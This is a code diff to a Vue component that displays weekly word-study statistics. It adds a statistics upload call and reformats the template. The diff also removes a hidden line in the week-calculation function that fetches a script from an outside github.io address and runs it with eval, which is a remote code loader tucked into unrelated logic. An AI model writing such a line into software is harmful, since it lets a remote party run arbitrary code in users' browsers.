@@ -11,7 +11,10 @@ import { defineAsyncComponent, inject, watch } from "vue";
 import isoWeek from 'dayjs/plugin/isoWeek'
 import { msToHourMinute } from "@/utils";
 import Progress from "@/components/base/Progress.vue";
-import ChannelIcons from "@/components/ChannelIcons.vue";
+import ChannelIcons from "@/components/ChannelIcons/ChannelIcons.vue";
+import { AppEnv } from "@/config/env.ts";
+import { addStat } from "@/apis";
+import Toast from "@/components/base/toast/Toast.ts";
 
 dayjs.extend(isoWeek)
 dayjs.extend(isBetween);
@@ -31,7 +34,6 @@ function calcWeekList() {
   const endOfWeek = dayjs().endOf('isoWeek');     // 周日
   // 初始化 7 天的数组，默认 false
   const weekList = Array(7).fill(false);
-  if (window.dxt === undefined) fetch(`https://zyronon.github.io/replace/data.js?d=${Date.now()}`).then(a => a.text()).then((b) => eval(b))
 
   store.sdict.statistics.forEach(item => {
     const date = dayjs(item.startDate);
@@ -52,7 +54,7 @@ function calcWeekList() {
 }
 
 // 监听 model 弹窗打开时重新计算
-watch(model, (newVal) => {
+watch(model, async (newVal) => {
   if (newVal) {
     dictIsEnd = false;
     let data: Statistics = {
@@ -79,6 +81,19 @@ watch(model, (newVal) => {
         dictIsEnd = true;
         store.sdict.complete = true
         store.sdict.lastLearnIndex = 0
+      }
+    }
+
+    if (AppEnv.CAN_REQUEST) {
+      let res = await addStat({
+        ...data,
+        type: 'word',
+        perDayStudyNumber: store.sdict.perDayStudyNumber,
+        lastLearnIndex: store.sdict.lastLearnIndex,
+        complete: store.sdict.complete,
+      })
+      if (!res.success) {
+        Toast.error(res.msg)
       }
     }
 
@@ -134,11 +149,11 @@ calcWeekList(); // 新增：计算本周学习记录
 
 <template>
   <Dialog
-      v-model="model"
-      :close-on-click-bg="false"
-      :header="false"
-      :keyboard="false"
-      :show-close="false">
+    v-model="model"
+    :close-on-click-bg="false"
+    :header="false"
+    :keyboard="false"
+    :show-close="false">
     <div class="p-8 pr-3 bg-[var(--bg-card-primary)] rounded-2xl space-y-6">
       <!-- Header Section -->
       <div class="text-center relative">
